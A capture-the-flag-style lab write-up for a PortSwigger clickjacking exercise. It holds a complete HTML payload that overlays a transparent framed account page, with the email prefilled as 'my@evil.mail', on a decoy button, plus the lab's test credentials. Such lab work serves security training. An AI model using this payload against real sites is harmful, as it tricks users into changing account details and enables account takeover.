# Clickjacking with form input data prefilled from a URL parameter

## Task

This lab extends the basic [clickjacking example](https://portswigger.net/web-security/clickjacking) in [Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to click on a "update email" button without the user's knowledge.

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address. The account is solved when the email address is changed.

You have an account on the application that you can use to help design your attack. The credentials are: carlos / montoya. 

## Solution

```xml
<html>
<head>
  <style>
    #target_website {
      position: relative;
      width: 260px;
      height: 424px;
      opacity: 0.5;
      z-index: 2;
      top: -389px;
      left: -40px;
    }

    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
   <button>Just click this button!</button>
  </div>
  <iframe id="target_website" src="https://ac101ff41f9f41d58078175500d90028.web-security-academy.net/email?email=my@evil.mail">
  </iframe>
</body>

</html>
```